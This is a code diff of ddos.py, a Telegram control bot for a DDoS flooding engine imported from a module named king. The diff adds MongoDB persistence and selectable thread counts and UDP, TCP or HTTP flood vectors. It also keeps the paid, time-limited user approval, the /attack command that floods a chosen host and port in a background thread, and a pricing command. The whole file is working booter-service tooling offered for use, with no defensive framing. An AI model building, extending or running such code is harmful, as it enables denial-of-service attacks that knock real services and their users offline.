@@ -1,42 +1,53 @@
 #!/usr/bin/python3
-"""
-ddos.py — Telegram control bot for the king UDP engine.
-
-Wired to king.py via `from king import attack, start_attack`.
-No subprocess, no ELF binary, no browser gate.
-
-Attack is fired in a background thread; errors surface to the requesting
-user via a follow-up Telegram message.
-"""
-
 import datetime
 import os
 import threading
 
 import telebot
 
-from king import attack, start_attack  # noqa: F401
+import config
+from king import attack, start_attack, VECTORS  # noqa: F401
 
 
-# ── config ────────────────────────────────────────────────────────────────
+# ── Mongo bootstrap (with file fallback) ──────────────────────────────────
 
-bot = telebot.TeleBot(os.environ.get("BOT_TOKEN", ""))
+_mongo_client = None
+_mongo_db = None
+_users_col = None
+_logs_col = None
 
-BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+if config.MONGO_URI:
+    try:
+        from pymongo import MongoClient
+        _mongo_client = MongoClient(config.MONGO_URI, serverSelectionTimeoutMS=5000)
+        _mongo_db = _mongo_client[config.MONGO_DB]
+        _users_col = _mongo_db[config.MONGO_USERS]
+        _logs_col = _mongo_db[config.MONGO_LOGS]
+        _mongo_client.server_info()  # ping
+        print(f"[mongo] connected to {config.MONGO_DB}")
+    except Exception as e:
+        print(f"[mongo] unavailable ({e}); falling back to files")
+        _mongo_client = None
+        _users_col = None
+        _logs_col = None
 
-admin_id = ["8789271943"]
 
-USER_FILE = os.path.join(BASE_DIR, "users.txt")
-LOG_FILE = os.path.join(BASE_DIR, "log.txt")
+# ── config aliases ────────────────────────────────────────────────────────
 
-user_approval_expiry = {}   # user_id -> datetime
-bgmi_cooldown = {}          # user_id -> datetime
-COOLDOWN_TIME = 0           # seconds; 0 = no cooldown
+bot = telebot.TeleBot(config.BOT_TOKEN)
+
+admin_id = list(config.ADMIN_IDS)
+USER_FILE = config.USER_FILE
+LOG_FILE = config.LOG_FILE
+
+user_approval_expiry = {}   # user_id -> datetime (mirror of Mongo)
+bgmi_cooldown = {}          # user_id -> datetime (in-memory)
+COOLDOWN_TIME = config.COOLDOWN_TIME
 
 
-# ── user store ────────────────────────────────────────────────────────────
+# ── persistence layer ─────────────────────────────────────────────────────
 
-def read_users():
+def _file_read_users():
     try:
         with open(USER_FILE, "r") as f:
             return [ln.strip() for ln in f.read().splitlines() if ln.strip()]
@@ -44,16 +55,92 @@ def read_users():
         return []
 
 
-def save_users():
+def _file_write_users(uids):
     with open(USER_FILE, "w") as f:
-        for uid in allowed_user_ids:
+        for uid in uids:
             f.write(f"{uid}\n")
 
 
-allowed_user_ids = read_users()
+def load_users():
+    """Populate allowed_user_ids + user_approval_expiry from store."""
+    global allowed_user_ids
+    allowed_user_ids = []
+    user_approval_expiry.clear()
+
+    if _users_col is not None:
+        for doc in _users_col.find({}):
+            uid = str(doc.get("_id"))
+            allowed_user_ids.append(uid)
+            expiry = doc.get("expiry")
+            if expiry:
+                user_approval_expiry[uid] = expiry
+    else:
+        allowed_user_ids = _file_read_users()
+
+    return allowed_user_ids
 
 
-# ── logging ───────────────────────────────────────────────────────────────
+def persist_add(user_id, expiry):
+    if _users_col is not None:
+        _users_col.update_one(
+            {"_id": str(user_id)},
+            {"$set": {"expiry": expiry, "added_at": datetime.datetime.utcnow()}},
+            upsert=True,
+        )
+    else:
+        uids = _file_read_users()
+        if str(user_id) not in uids:
+            uids.append(str(user_id))
+            _file_write_users(uids)
+
+
+def persist_remove(user_id):
+    if _users_col is not None:
+        _users_col.delete_one({"_id": str(user_id)})
+    else:
+        uids = [u for u in _file_read_users() if u != str(user_id)]
+        _file_write_users(uids)
+
+
+def persist_clear():
+    if _users_col is not None:
+        _users_col.delete_many({})
+    else:
+        _file_write_users([])
+
+
+def persist_log(user_id, command, target=None, port=None, duration=None, vector=None):
+    entry = {
+        "user_id": str(user_id),
+        "ts": datetime.datetime.utcnow(),
+        "command": command,
+        "target": target,
+        "port": port,
+        "duration": duration,
+        "vector": vector,
+    }
+    if _logs_col is not None:
+        try:
+            _logs_col.insert_one(entry)
+        except Exception:
+            pass
+    # always mirror to file — cheap, greppable
+    line = (f"UserID: {user_id} | {entry['ts']} | {command}"
+            + (f" | Target: {target}" if target else "")
+            + (f" | Port: {port}" if port else "")
+            + (f" | Time: {duration}" if duration else "")
+            + (f" | Vector: {vector}" if vector else ""))
+    try:
+        with open(LOG_FILE, "a") as f:
+            f.write(line + "\n")
+    except OSError:
+        pass
+
+
+allowed_user_ids = load_users()
+
+
+# ── logging helper (kept for /logs, /mylogs) ─────────────────────────────
 
 def log_command(user_id, target, port, duration):
     try:
@@ -66,19 +153,7 @@ def log_command(user_id, target, port, duration):
         f.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {duration}\n\n")
 
 
-def record_command_logs(user_id, command, target=None, port=None, duration=None):
-    entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
-    if target:
-        entry += f" | Target: {target}"
-    if port:
-        entry += f" | Port: {port}"
-    if duration:
-        entry += f" | Time: {duration}"
-    with open(LOG_FILE, "a") as f:
-        f.write(entry + "\n")
-
-
-# ── approval expiry ───────────────────────────────────────────────────────
+# ── approval helpers ──────────────────────────────────────────────────────
 
 def get_remaining_approval_time(user_id):
     expiry = user_approval_expiry.get(user_id)
@@ -102,9 +177,10 @@ def set_approval_expiry_date(user_id, duration, time_unit):
     elif unit in ("month", "months"):
         expiry = now + datetime.timedelta(days=30 * duration)
     else:
-        return False
-    user_approval_expiry[user_id] = expiry
-    return True
+        return None
+    user_approval_expiry[str(user_id)] = expiry
+    persist_add(user_id, expiry)
+    return expiry
 
 
 # ── /add ──────────────────────────────────────────────────────────────────
@@ -140,11 +216,14 @@ def add_user(message):
         return
 
     allowed_user_ids.append(user_to_add)
-    save_users()
+    expiry = set_approval_expiry_date(user_to_add, duration, time_unit)
 
-    if set_approval_expiry_date(user_to_add, duration, time_unit):
-        expiry = user_approval_expiry[user_to_add].strftime("%Y-%m-%d %H:%M:%S")
-        bot.reply_to(message, f"User {user_to_add} added for {duration} {time_unit}. Expires {expiry}.")
+    if expiry:
+        bot.reply_to(
+            message,
+            f"User {user_to_add} added for {duration} {time_unit}. "
+            f"Expires {expiry.strftime('%Y-%m-%d %H:%M:%S')}.",
+        )
     else:
         bot.reply_to(message, "Failed to set expiry.")
 
@@ -171,7 +250,7 @@ def remove_user(message):
     allowed_user_ids.remove(user_to_remove)
     user_approval_expiry.pop(user_to_remove, None)
     bgmi_cooldown.pop(user_to_remove, None)
-    save_users()
+    persist_remove(user_to_remove)
     bot.reply_to(message, f"User {user_to_remove} removed.")
 
 
@@ -210,16 +289,17 @@ def clear_logs_command(message):
         bot.reply_to(message, "Not authorized.")
         return
 
+    if _logs_col is not None:
+        _logs_col.delete_many({})
+
     try:
         with open(LOG_FILE, "r+") as f:
-            if not f.read().strip():
-                bot.reply_to(message, "Logs already cleared.")
-                return
             f.seek(0)
             f.truncate(0)
-        bot.reply_to(message, "Logs cleared.")
     except FileNotFoundError:
-        bot.reply_to(message, "No logs to clear.")
+        pass
+
+    bot.reply_to(message, "Logs cleared.")
 
 
 # ── /clearusers ───────────────────────────────────────────────────────────
@@ -234,7 +314,7 @@ def clear_users_command(message):
     allowed_user_ids.clear()
     user_approval_expiry.clear()
     bgmi_cooldown.clear()
-    save_users()
+    persist_clear()
     bot.reply_to(message, "Users cleared.")
 
 
@@ -298,23 +378,42 @@ def show_command_logs(message):
         bot.reply_to(message, "No command logs found.")
         return
 
-    bot.reply_to(message, "Your Command Logs:\n" + "".join(lines))
+    bot.reply_to(message, "Your Command Logs:\n" + "".join(lines[-30:]))
 
 
-# ── /attack ───────────────────────────────────────────────────────────────
+# ── /attack parser ────────────────────────────────────────────────────────
 
 def _parse_attack(text):
     """
-    Accept three shapes:
-        /attack <host> <port> <time>
-        /attack <host>:<port> <time>
-        /attack <host>:<port>          (time = 60s default)
+    Accept:
+        /attack <host> <port> <time> [threads] [vector]
+        /attack <host>:<port> <time> [threads] [vector]
+        /attack <host>:<port>                      (time=60, defaults)
 
-    Returns (target, port, duration) or raises ValueError.
+    vector ∈ {"udp","tcp","http"}. Unknown trailing word = vector parse error.
+    Returns (target, port, duration, threads, vector).
     """
     parts = text.split()
+    threads = config.DEFAULT_THREADS
+    vector = config.DEFAULT_VECTOR
+    duration_default = config.DEFAULT_DURATION
+
+    # detect trailing vector
+    if len(parts) >= 2 and parts[-1].lower() in VECTORS:
+        vector = parts[-1].lower()
+        parts = parts[:-1]
+
+    # detect trailing threads (numeric and not the port slot)
+    if len(parts) >= 2 and parts[-1].isdigit():
+        candidate = int(parts[-1])
+        # threads sits after duration; only treat as threads if we already
+        # have at least 3 tokens (cmd target duration ...)
+        if len(parts) >= 4:
+            threads = candidate
+            parts = parts[:-1]
 
     if len(parts) == 4:
+        # cmd target port duration
         target = parts[1]
         try:
             port = int(parts[2])
@@ -322,57 +421,54 @@ def _parse_attack(text):
         except ValueError:
             raise ValueError("port and time must be integers")
 
-    elif len(parts) == 3:
+    elif len(parts) in (2, 3):
         head = parts[1]
         if ":" not in head:
-            raise ValueError("missing port")
+            raise ValueError("missing port — use host:port or split form")
         host, _, port_str = head.rpartition(":")
         if not host or not port_str.isdigit():
             raise ValueError("malformed host:port")
         target = host
         port = int(port_str)
-        try:
-            duration = int(parts[2])
-        except ValueError:
-            raise ValueError("time must be an integer")
-
-    elif len(parts) == 2:
-        head = parts[1]
-        if ":" not in head:
-            raise ValueError("missing port")
-        host, _, port_str = head.rpartition(":")
-        if not host or not port_str.isdigit():
-            raise ValueError("malformed host:port")
-        target = host
-        port = int(port_str)
-        duration = 60
+        if len(parts) == 3:
+            try:
+                duration = int(parts[2])
+            except ValueError:
+                raise ValueError("time must be an integer")
+        else:
+            duration = duration_default
 
     else:
         raise ValueError(
-            "usage: /attack <host> <port> <time> | "
-            "/attack <host>:<port> <time> | "
-            "/attack <host>:<port>"
+            "usage: /attack <host> <port> <time> [threads] [udp|tcp|http]\n"
+            "       /attack <host>:<port> <time> [threads] [vector]\n"
+            "       /attack <host>:<port> [vector]"
         )
 
     if not target:
         raise ValueError("empty target")
     if not (0 < port < 65536):
         raise ValueError(f"port out of range: {port}")
-    if not (0 < duration <= 1000):
-        raise ValueError(f"time must be 1-1000s, got {duration}")
+    if not (0 < duration <= config.MAX_DURATION):
+        raise ValueError(f"time must be 1-{config.MAX_DURATION}s")
+    if not (0 < threads <= config.MAX_THREADS):
+        raise ValueError(f"threads must be 1-{config.MAX_THREADS}")
 
-    return target, port, duration
+    return target, port, duration, threads, vector
 
 
-def start_attack_reply(message, target, port, duration):
+# ── /attack ───────────────────────────────────────────────────────────────
+
+def start_attack_reply(message, target, port, duration, threads, vector):
     user_info = message.from_user
     username = user_info.username or user_info.first_name
-
     text = (
         f"{username}, ATTACK STARTED.\n\n"
-        f"Target: {target}\n"
-        f"Port:   {port}\n"
-        f"Time:   {duration} seconds"
+        f"Target:  {target}\n"
+        f"Port:    {port}\n"
+        f"Time:    {duration}s\n"
+        f"Threads: {threads}\n"
+        f"Vector:  {vector.upper()}"
     )
     bot.reply_to(message, text)
 
@@ -385,7 +481,6 @@ def handle_attack(message):
         bot.reply_to(message, "Unauthorized.")
         return
 
-    # Cooldown (admins bypass)
     if user_id not in admin_id and COOLDOWN_TIME > 0:
         last = bgmi_cooldown.get(user_id)
         if last and (datetime.datetime.now() - last).total_seconds() < COOLDOWN_TIME:
@@ -394,7 +489,7 @@ def handle_attack(message):
             return
 
     try:
-        target, port, duration = _parse_attack(message.text)
+        target, port, duration, threads, vector = _parse_attack(message.text)
     except ValueError as e:
         bot.reply_to(message, f"Parse error: {e}")
         return
@@ -402,16 +497,27 @@ def handle_attack(message):
     if user_id not in admin_id:
         bgmi_cooldown[user_id] = datetime.datetime.now()
 
-    record_command_logs(user_id, "/attack", target, port, duration)
+    persist_log(user_id, "/attack", target, port, duration, vector)
     log_command(user_id, target, port, duration)
-    start_attack_reply(message, target, port, duration)
+    start_attack_reply(message, target, port, duration, threads, vector)
 
     def _run():
+        t0 = datetime.datetime.now()
         try:
-            attack(target, port, duration, threads=100)
+            n = attack(target, port, duration, threads=threads,
+                       payload_size=config.PAYLOAD_SIZE, vector=vector)
+            elapsed = (datetime.datetime.now() - t0).total_seconds()
+            bot.send_message(
+                message.chat.id,
+                f"✅ Attack complete\n"
+                f"Target:   {target}:{port}\n"
+                f"Vector:   {vector.upper()}\n"
+                f"Workers:  {n}/{threads}\n"
+                f"Duration: {elapsed:.1f}s",
+            )
         except (ValueError, RuntimeError, OSError) as e:
             try:
-                bot.send_message(message.chat.id, f"Attack error: {e}")
+                bot.send_message(message.chat.id, f"❌ Attack error: {e}")
             except Exception:
                 pass
 
@@ -424,15 +530,15 @@ def handle_attack(message):
 def show_help(message):
     text = (
         "Available commands:\n"
-        "/attack   — start an attack\n"
-        "            /attack <host> <port> <time>\n"
-        "            /attack <host>:<port> <time>\n"
-        "            /attack <host>:<port>\n"
-        "/rules    — read rules\n"
-        "/mylogs   — your recent attacks\n"
-        "/plan     — pricing\n"
-        "/myinfo   — your account info\n"
-        "/admincmd — admin commands"
+        "/attack    — start an attack\n"
+        "             /attack <host> <port> <time> [threads] [udp|tcp|http]\n"
+        "             /attack <host>:<port> <time> [threads] [vector]\n"
+        "             /attack <host>:<port> [vector]\n"
+        "/rules     — read rules\n"
+        "/mylogs    — your recent attacks\n"
+        "/plan      — pricing\n"
+        "/myinfo    — your account info\n"
+        "/admincmd  — admin commands"
     )
     bot.reply_to(message, text)
 
@@ -523,4 +629,6 @@ def broadcast_message(message):
 # ── boot ──────────────────────────────────────────────────────────────────
 
 if __name__ == "__main__":
+    storage = "mongo" if _users_col is not None else "files"
+    print(f"[boot] storage={storage}  users={len(allowed_user_ids)}  vectors={VECTORS}")
     bot.infinity_polling(skip_pending=True, timeout=30)
